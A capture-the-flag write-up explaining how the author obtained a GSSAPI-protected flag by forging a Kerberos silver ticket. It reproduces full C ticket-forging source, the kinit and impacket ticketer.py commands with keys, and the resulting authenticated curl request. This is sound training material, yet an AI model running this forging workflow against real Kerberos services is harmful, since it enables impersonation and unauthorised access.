# Torso Of Web Server (5 pts)
Hi Expert,

some remains of a web server were found on http://78.128.246.143. Maybe the administrators didn't finish it, maybe it just started to fall apart without maintenance, but it certainly contains interesting information that needs to be obtained.
##
Good Luck!
HINT: Check also other services on given server 78.128.246.143.


## Checking the web server
After navigating to supplied link, we can see Apache directory listing containing 4 files.
 - apache2.conf - Apache Configuration File
 - apache2.keytab - Keytab file used for GSSAPI negotiations
 - flag.txt - GSSAPI protected flag itself
 - ticketer_mit.c - `C` code for generating Kerberos Silver Ticket


## Other services
Running an nmap scan reveals another service running on the host,`Kerberos` on port `88`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-20 10:58 CEST
Nmap scan report for 78.128.246.143
Host is up (0.055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE      VERSION
80/tcp open  http         Apache httpd 2.4.38 ((Debian))
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 526   2021-09-29 09:36  apache2.conf
| 164   2021-10-05 11:12  apache2.keytab
| 26    2021-10-05 11:12  flag.txt
| 6.1K  2021-09-29 09:13  ticketer_mit.c
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
88/tcp open  kerberos-sec MIT Kerberos (server time: 2021-10-20 08:58:49Z)
Service Info: Host: SUPERCLIENT.TCC

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds
```

## Checking the files

### Apache Configuration
```apache
Listen 19091
<VirtualHost *:19091>
	ServerName ctfb4.tcc
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	DocumentRoot /opt/ctfb4/web
	<Directory "/opt/ctfb4/web">
		Require all granted
		Options +Indexes
		IndexOptions +ShowForbidden
	</Directory>

	<Files "flag.txt">
		AuthType GSSAPI
		AuthName "Designing an Authentication System: a Dialogue in Four Scenes"
		GssapiCredStore keytab:/opt/ctfb4/web/apache2.keytab
		Require user "euripides@SUPERCLIENT.TCC"
	</Files>
</VirtualHost>
```

So apparently the flag is protected using GSSAPI authentication, which requires us to authenticate as `euripides` user in `SUPERCLIENT.TCC` domain.

### Apache Keytab
Binary file containing the credentials, interestingly, reading the content- we can see
```
USUPERCLIENT.TCCHTTP	ctfb4.tccaTK� ���wQ<����l:�`yV����	(#C�5ESUPERCLIENT.TCCHTTP	ctfb4.tccaTK�7F�׬V"�1����I�%  

```
Apparently this keytab is for user `ctf4b.tcc` instead of `euripides`, so we cannot use this keytab directly, bummer.

### Flag
The flag itself - unreadable currently - protected by GSSAPI auth

### ticketer_mit.c
`C` code for generating Silver TGS Tickets

```c
/*
 * ctf ticketer for mit ccache
 */

#include <com_err.h>
#include <krb5.h>
#include <stdio.h>
#include <string.h>

#define SERVICE_KEY "9c008f673b0c34d28ff483587f77ddb76f35545fcc69a0ae709f16f20e8765ee"
#define NEW_PRINC "client1"

// k5-int.h
krb5_error_code decode_krb5_enc_tkt_part(const krb5_data *output, krb5_enc_tkt_part **rep);
krb5_error_code encode_krb5_enc_tkt_part(const krb5_enc_tkt_part *rep, krb5_data **code);
void KRB5_CALLCONV krb5_free_enc_tkt_part(krb5_context, krb5_enc_tkt_part *);
krb5_error_code encode_krb5_ticket(const krb5_ticket *rep, krb5_data **code);

krb5_context context;

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

uint8_t *datahex(char *string) {
    size_t slength = 0;
    size_t dlength = 0;
    uint8_t *data = NULL;
    size_t index = 0;
    char c;
    int value = 0;

    if (string == NULL)
        return NULL;

    slength = strlen(string);
    if ((slength % 2) != 0) // must be even
        return NULL;

    dlength = slength / 2;

    data = malloc(dlength);
    memset(data, 0, dlength);

    index = 0;
    while (index < slength) {
        c = string[index];
        value = 0;
        if (c >= '0' && c <= '9')
            value = (c - '0');
        else if (c >= 'A' && c <= 'F')
            value = (10 + (c - 'A'));
        else if (c >= 'a' && c <= 'f')
            value = (10 + (c - 'a'));
        else {
            free(data);
            return NULL;
        }

        data[(index / 2)] += value << (((index + 1) % 2) * 4);

        index++;
    }

    return data;
}

/*
 * read one credential from default cache
 */
void get_creds(krb5_creds *out_creds) {
    krb5_ccache cache;
    krb5_principal princ;
    char *princ_name;
    krb5_cc_cursor cur;

    krb5_cc_default(context, &cache);
    krb5_cc_get_principal(context, cache, &princ);
    krb5_unparse_name(context, princ, &princ_name);
    krb5_free_principal(context, princ);
    printf("Ticket cache: %s:%s\nDefault principal: %s\n\n", krb5_cc_get_type(context, cache), krb5_cc_get_name(context, cache), princ_name);
    krb5_free_unparsed_name(context, princ_name);

    // get credential, expects only one "service for service" credential to be mangled
    krb5_cc_start_seq_get(context, cache, &cur);
    krb5_cc_next_cred(context, cache, &cur, out_creds);
    krb5_cc_end_seq_get(context, cache, &cur);
    krb5_cc_close(context, cache);

    printf("creds session key:\n");
    hexdump(out_creds->keyblock.contents, out_creds->keyblock.length);

    return;
}

/*
 * generate new ticket krb5_data from the template
 */
void customize_ticket(krb5_creds *creds, krb5_keyblock *key, krb5_principal *new_princ, krb5_data **out_ticket) {
    krb5_ticket *tkt = NULL;
    krb5_data scratch;
    krb5_data *scratch2 = NULL;
    krb5_enc_tkt_part *dec_tkt_part = NULL;

    krb5_decode_ticket(&creds->ticket, &tkt);
    scratch.length = tkt->enc_part.ciphertext.length;
    scratch.data = malloc(tkt->enc_part.ciphertext.length);
    krb5_c_decrypt(context, key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, &tkt->enc_part, &scratch);
    decode_krb5_enc_tkt_part(&scratch, &dec_tkt_part);
    krb5_free_data_contents(context, &scratch);

    printf("decrypted ticket session key:\n");
    hexdump(dec_tkt_part->session->contents, dec_tkt_part->session->length);

    krb5_free_principal(context, dec_tkt_part->client);
    krb5_copy_principal(context, *new_princ, &dec_tkt_part->client);

    encode_krb5_enc_tkt_part(dec_tkt_part, &scratch2);
    krb5_c_encrypt(context, key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, scratch2, &tkt->enc_part);
    encode_krb5_ticket(tkt, out_ticket);
    krb5_free_data(context, scratch2);

    krb5_free_enc_tkt_part(context, dec_tkt_part);
    krb5_free_ticket(context, tkt);

    return;
}

/*
 * update credential principal and ticket
 */
void customize_creds(krb5_creds *creds, krb5_principal *new_princ, krb5_data *new_ticket) {

    krb5_free_data_contents(context, &creds->ticket);
    creds->ticket = *new_ticket;
    krb5_free_principal(context, creds->client);
    krb5_copy_principal(context, *new_princ, &creds->client);

    return;
}

/*
 * save creds to disk
 */
void save_creds(krb5_creds *creds) {
    krb5_ccache new_cache;

    krb5_cc_new_unique(context, "FILE", NULL, &new_cache);
    printf("new cache name: %s\n", krb5_cc_get_name(context, new_cache));
    krb5_cc_initialize(context, new_cache, creds->client);
    krb5_cc_store_cred(context, new_cache, creds);
    krb5_cc_close(context, new_cache);
}

/*
 * create silver ticket from TGS
 */
int main(int argc, char *argv[]) {
    char *progname;
    krb5_keyblock srv_key;
    krb5_principal new_princ;
    krb5_creds creds;
    krb5_data *new_ticket = NULL;

    progname = argv[0];

    krb5_init_context(&context);

    // prepare args
    srv_key.enctype = 18;
    srv_key.contents = (krb5_octet *)datahex(argv[1]);
    srv_key.length = strlen(argv[1]) / 2;
    krb5_parse_name(context, argv[2], &new_princ);

    get_creds(&creds);
    customize_ticket(&creds, &srv_key, &new_princ, &new_ticket);
    customize_creds(&creds, &new_princ, new_ticket);
    free(new_ticket); // must not free ticket contents here as it's swapped into creds
    save_creds(&creds);

    // cleanup
    krb5_free_cred_contents(context, &creds);
    krb5_free_principal(context, new_princ);
    krb5_free_keyblock_contents(context, &srv_key);

    krb5_free_context(context);

    exit(0);
}
```

## Kerberos
I had exactly zero experience with Kerberos prior to this challenge, so I started by studying how Kerberos works, and how does it work with GSSAPI, after some poking around, I also found out that user `euripides` is not actually present in Kerberos, how am I suppose to authenticate as him then? Given the supplied `C` code, the solution is probably something called `Silver Ticket`

### Midway Summary
So after summing up what I know so far:

- I got `apache2.keytab` file containing credentials for `HTTP/ctfb4.tcc`
- `euripides` is not a valid user in Kerberos
- I need to request `/flag.txt` as `euripides`


### Keytab
Now I need to use the keytab, for that I needed to download few kerberos utils, mainly `klist` and `kinit`, running klist now shows no credentials.
```
>>> klist              
klist: No credentials cache found (filename: /tmp/krb5cc_1000)
```

So lets initialize the kerberos credentials using the keytab file (I used `KeyTabExtract` repo to extract the username from the keytab)
```
>>> kinit "HTTP/ctfb4.tcc@SUPERCLIENT.TCC" -k -t apache2.keytab
>>> klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: HTTP/ctfb4.tcc@SUPERCLIENT.TCC

Valid starting      Expires             Service principal
8.11.2021 10:25:46  8.11.2021 22:25:46  krbtgt/SUPERCLIENT.TCC@SUPERCLIENT.TCC
	renew until 9.11.2021 10:25:41

```

Interesting! Now it seems we have a valid kerberos ticket! So lets fire up wireshark, filter traffic for kerberos packets, before that, I created an entry in `/etc/hosts` as follows
```
78.128.246.143 ctfb4.tcc
```

then ran
```
curl --negotiate -u: ctfb4.tcc/flag.txt -v
```

to request `flag.txt` using the GSSAPI authentication, and then observe the traffic in wireshark.

![wireshark](https://user-images.githubusercontent.com/20358070/140717274-de3089e7-cd6c-4088-ad06-c0b82c9948b7.png)

This is fortunately the correct kerberos flow! However we got 401 as we were not `euripides`
![kerberos](https://images.contentstack.io/v3/assets/blt36c2e63521272fdc/blt3be31962ee296b38/5e04d343f5916f4381bc890a/image.png)

We can now also observe another user in `klist` output - the HTTP service we generated TGS for.
```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: HTTP/ctfb4.tcc@SUPERCLIENT.TCC

Valid starting      Expires             Service principal
8.11.2021 10:25:46  8.11.2021 22:25:46  krbtgt/SUPERCLIENT.TCC@SUPERCLIENT.TCC
	renew until 9.11.2021 10:25:41
8.11.2021 10:34:16  8.11.2021 22:25:46  HTTP/ctfb4.tcc@SUPERCLIENT.TCC
	renew until 9.11.2021 10:25:41
```


## Silver Tickets
- A Silver Ticket is a forged service authentication ticket.
A hacker can create a Silver Ticket by cracking a computer account password and using that to create a fake authentication ticket. Kerberos allows services (low-level Operating System programs) to log in without double-checking that their token is actually valid, which hackers have exploited to create Silver Tickets.

Hmm, `without double-checking that their token is actually valid` that sounds promising! As the target user `euripides` is not in Kerberos, allowing access as him without "double-checking that their token is actually valid" is exactly what we are waiting for.

For few hours I tried to compile and use the supplied `ticketer_mit.c` code without luck, so in the end I used `impacket`'s `ticketer` tool to generate silver tickets, after a lot of trial and error, I came up with this command.

```
ticketer.py -dc-ip 78.128.246.143 -domain "SUPERCLIENT.TCC" -debug -aesKey 16049ef7a077513c1ae0f2e69a1d6c3aff607956c1ff7fff1a092823431da235 -user "HTTP/ctfb4.tcc" -domain-sid S-1-5-21-1423455951-1752654185-1824483205 "euripides" -spn "HTTP/ctfb4.tcc" -k apache2.keytab
```

Where
- `-dc-ip` is the IP address of the kerberos domain controller
- `-domain` is the kerberos domain itself
- `-debug` just more verbose output
- `-aesKey` likely not neccesary when using keytab
- `-user` user for which we possess ticket currently
- `-domain-sid` required, but in this case completely random argument
- `[ARG] - euripides` for which user to generate silver ticket for
- `-spn` Service Principal Name
- `-k` path to keytab file

Running this command:
```
>>> ticketer.py -keytab apache2.keytab -dc-ip 78.128.246.143 -domain "SUPERCLIENT.TCC" -aesKey 16049ef7a077513c1ae0f2e69a1d6c3aff607956c1ff7fff1a092823431da235 -user "HTTP/ctfb4.tcc" -domain-sid S-1-5-21-1423455951-1752654185-1824483205 "euripides" -spn "HTTP/ctfb4.tcc" -k apache2.keytab 

Impacket v0.9.24.dev1+20211015.125134.c0ec6102 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SUPERCLIENT.TCC/euripides
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in euripides.ccache
```

Now we need to get this ticket into `klist`, running `klist` shows that this ticket is not present currently,
```
>>> klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: HTTP/ctfb4.tcc@SUPERCLIENT.TCC

Valid starting      Expires             Service principal
8.11.2021 10:25:46  8.11.2021 22:25:46  krbtgt/SUPERCLIENT.TCC@SUPERCLIENT.TCC
	renew until 9.11.2021 10:25:41
8.11.2021 10:34:16  8.11.2021 22:25:46  HTTP/ctfb4.tcc@SUPERCLIENT.TCC
	renew until 9.11.2021 10:25:41
```

So I've ran 
```
>>> cp euripides.ccache /tmp/krb5cc_1000 && klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: euripides@SUPERCLIENT.TCC

Valid starting      Expires             Service principal
8.11.2021 10:39:12  6.11.2031 10:39:12  HTTP/ctfb4.tcc@SUPERCLIENT.TCC
	renew until 6.11.2031 10:39:12
```

Principal euripides! Nice, lets try to request the flag once more now.
```
>>> curl --negotiate -u: ctfb4.tcc/flag.txt -v   
*   Trying 78.128.246.143:80...
* TCP_NODELAY set
* Connected to ctfb4.tcc (78.128.246.143) port 80 (#0)
* Server auth using Negotiate with user ''
> GET /flag.txt HTTP/1.1
> Host: ctfb4.tcc
> Authorization: Negotiate YIIE5QYGKwYBBQUCoIIE2TCCBNWgDTALBgkqhkiG9xIBAgKiggTCBIIEvmCCBLoGCSqGSIb3EgECAgEAboIEqTCCBKWgAwIBBaEDAgEOogcDBQAgAAAAo4IDtWGCA7EwggOtoAMCAQWhERsPU1VQRVJDTElFTlQuVENDohwwGqADAgEBoRMwERsESFRUUBsJY3RmYjQudGNjo4IDczCCA2+gAwIBEqEDAgECooIDYQSCA13RlLsfzqunOq97tSxIF1Lg++VowHVHqRoALl2Dm+RcGm8g/z01+5H1jDqk1gdhXO8lMt7371PI3nrWngu8DpxmvrWxD2WXmKKgseLXtQRsj3uO9D9vG+HBA9NQt/UVoRh7WjsE7Smp+NatnW6KZEzlM5fATFa34uEPNty54FrCscNDZuTPSSlexNxoNJmimZrX+OppW426HifeDUQuvmqpAyK89HFHLLXVyvDZPjYeD42E15OQupUMldfZwEYbPXZwWU6G5SyiJiL/AdU+7DKIlj2GH0epO5vF4xoqkQbRPF593fDbzdJE6yOWKI6yKj3YXi2qF2i8ReqL0/sMJ/8l5rAzSS7Qls1Mk1/MGQ0ScefASGvCrX9JkY/67j3bZ5+wKeBVQAcKvV3PVb3VNb68yKudlHMWKkjBRYz4hn2XngpCoPhhEi1kNLbNzvQVCmnMixgl/MNuCK8jNQwWKdmCQRxH6v3DFvmfBGELafxSgvW0YXMn2jq3LLPqNVb84guywsIq0VrxHBUFiSQ/4DiFkGXE6/wzNaqQKdviEb0cRmUIDVOGaOZYrZu8jHf/kYPGedjAtp6FKm1ysydW+/MzydrJoEQgvICwJY4yMn/P7bIlhkySEXSHAKevIVxh1pg0DqzXhNi39+BM83qQNz+MUrizA4Pnhp5qR9/AM2+Nksld2ov54LUxYNwFcubviqO5+K3l+ogO1Vg9xI20LWp85U/n7TsSM591UWtiPNdT4BDXXIA9ceBDmZ3cxOkJI5BrMuxY5BCRrjNxBa5gFMshkhAC27gBoAZ5p7NvoSHBdUpK/44CK3kWaVTF/naUH9IYQdBS7f5pfTWAwsQxBgShZ6YziY3YiHU4BEvDcYxYHILPOFaYC2E+Rh0O3D1QtsMLRZ5uD9eWe0M5kUcjLMB2RtxhhhYd6kbHWggOb1HyF/okM1GrZ+9cIMcSNNI8BGUzqaEPSoeO7Zg1u+1HScXuWa8HMb7xL9yG6xkKS5bX+ZG2fCpMzjkma8Jn54Hwd7M1W3op6Z85ZJCtkEO+l0jhKLti7JBuSly6J1bP7okirN/QBQoMT0ddKAVOSWDCf+SDurfgWwPJFZ9olDz6X3Oe55O8bgo2U62QTMxtHk44JKJwMCVUcDUiGc6gIPmkgdYwgdOgAwIBEqKBywSByCBScLUIHm2ezUXxDwDgMNNu32vztE103f4rPufrJ74aptN4lGRhFCUSTr9N7Sz9izPLGpK6GDVqkxnCKWiKdW9hqe+Nvputqil0s3knMDqjjn2cgUs5Nwiyp9YDpXdEypzHg4ILAfntIp7Du0pdzWXgtj4YFlS3Q0bfMGV/AFxCYLre1j47HB+RzwG+amHGVXlDIztioe7rlHF2Imi3Qnv06me0V0a0ST/PTISiylfr5nl6AJZ1y1IOITuVM876Arvl+nhWracE
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 08 Nov 2021 09:41:13 GMT
< Server: Apache/2.4.38 (Debian)
< WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRv+bH4A45ysY3Ptp15UPn4h9tAYKeAwZ45s/sAflnxmtlCbJSzZJCBBc1Ct/OSXouVn+IlQyV8sw1BEcjut+KBOaz1jB+G1klD5XdCQaC5dHd1Bj/6sP1xBQd+948eFoVj7sQmEV8Z1E5Ep37Uj+SR
< Last-Modified: Fri, 05 Nov 2021 19:52:41 GMT
< ETag: "1a-5d00ffc68ef10"
< Accept-Ranges: bytes
< Content-Length: 26
< Content-Type: text/plain
< 
FLAG{RhXd-vITI-vpXG-zQ3d}
* Connection #0 to host ctfb4.tcc left intact
```

And we got the flag! This challenge was very nice and I learned alot about Kerberos.